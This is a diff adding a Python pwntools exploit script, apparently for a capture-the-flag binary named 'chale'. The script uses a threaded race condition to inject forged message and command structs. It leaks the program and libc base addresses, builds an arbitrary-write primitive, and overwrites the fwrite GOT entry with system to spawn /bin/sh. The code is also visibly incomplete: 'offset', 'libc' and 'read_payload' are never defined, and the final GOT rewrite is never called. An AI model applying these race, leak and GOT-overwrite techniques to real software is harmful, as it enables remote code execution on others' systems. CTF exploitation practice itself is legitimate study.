@@ -1,0 +1,148 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import threading
+import time
+
+exe = ELF("./chale")
+# context.log_level='debug'
+context.terminal = ["foot"]
+# p = remote("addr", 1337)
+# while True:
+p2 = process([exe.path])
+p2.recvuntil("Port is ")
+port = int(p2.recvline())
+log.info(f"debug: {str(port)}")
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p2, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# sync = threading.Semaphore()
+event = threading.Event()
+# i = 0
+# Raw intereraction with challenge frontend
+PIPE_BUF = 0x1000
+ENDPOINT = "0"
+SERVICE_PORT = port
+
+
+# Raw intereraction with challenge frontend
+def send_message(message, author, sync: threading.Semaphore):
+    try:
+        r = remote(ENDPOINT, SERVICE_PORT)
+        r.sendline(message)
+        r.send(author)
+        sync.acquire()
+        r.send(b"\n")
+        r.close()
+    except:
+        pass
+
+# Helper function to inject a payload using the race condition
+def send_stage(payload: dict):
+    sync = threading.Semaphore()
+
+    payload_raw = flat(payload)
+
+    #payload = b""
+    payload_raw += cyclic(PIPE_BUF-len(payload_raw))
+    print("Starting threads...")
+    for i in range(30):
+        x = threading.Thread(target=send_message, args=(payload_raw,str(i).encode()*63, sync))
+        x.start()
+
+    print("Waiting for data to be sent")
+    time.sleep(5)
+    print("Triggering race condition!")
+    sync.release(30)
+
+### Helper functions to create C structs defined in challenge code
+def build_message(message, author, next):
+    return flat({
+        0: 0,
+        4: len(message),
+        8: p64(next),
+        16: author,
+        16+64: message
+    }, word_size=32)
+
+
+def build_command(instruction, parm1 = 0, parm2 = 0):
+    return flat({
+        0: 1,
+        4: instruction,
+        8: p64(parm1),
+        16: p64(parm2)
+    }, word_size=32)
+
+### Shortcuts for commands
+def command_flush():
+    return build_command(0xDEADC0DE)
+
+def command_print():
+    return build_command(0xdeadbeef)
+
+def command_redact(id, data):
+    return build_command(0xcafebabe, id, data)
+
+def leak_text(r: pwnlib.tubes.tube.tube):
+    payload = {
+        offset: command_print(),
+    }
+
+    send_stage(payload)
+
+    while True:
+        null_element_address = int(r.recvline_contains(b"Next is ").strip().split(b"Next is ")[1], 0)
+        print(f"Leaked {hex(null_element_address)}")
+
+        test_address = null_element_address-exe.symbols["NUL"]
+
+        # This is an hacky way to identify the correct address from the various leaks.
+        if test_address % 4096 == 0:
+            exe.address = test_address
+            break
+
+    print(f"Text base address = {hex(exe.address)}")
+    sleep(1)
+
+# Payload to perform arbitrary write
+def write_payload(addr, data):
+    return command_flush() + build_message(b"CUT-HERE-FOR-WRITE", b"CUT-HERE-FOR-WRITE\0", addr-0x80+6*8) + command_redact(1, data)
+
+
+def leak_libc(r: pwnlib.tubes.tube.tube):
+    # Before printing, we are gonna write 0x0 right before the address to be leaked
+    # So that mex->next is NULL
+    payload = {
+        offset: write_payload(exe.got.fwrite-0x8, 0x0) + read_payload(exe.got.fwrite, b"CUT-HERE-FOR-LIBC-LEAK", b"CUT-HERE-FOR-LIBC-LEAK\0"),
+    }
+    send_stage(payload)
+
+    # Discard useless prints
+    r.recvline_contains(b"'CUT-HERE-FOR-LIBC-LEAK' by CUT-HERE-FOR-LIBC-LEAK. Next is ")
+
+    # Read leaked address
+    leaked_address = u64(r.recvline().strip().split(b"'' by ")[1].split(b".")[0]+b'\x00\x00')
+    print(f"libc.sym.fwrite = {hex(leaked_address)}")
+    libc.address = leaked_address - libc.sym.fwrite
+    print(f"Libc base address = {hex(libc.address)}")
+    sleep(1)
+
+def rewrite_got(r: pwnlib.tubes.tube.tube):
+    payload = {
+        offset: write_payload(exe.got.fwrite, libc.sym.system) + build_message(b"/bin/sh", b"Master pwner", 0x0),
+    }
+
+    send_stage(payload)
+leak_libc(p2)
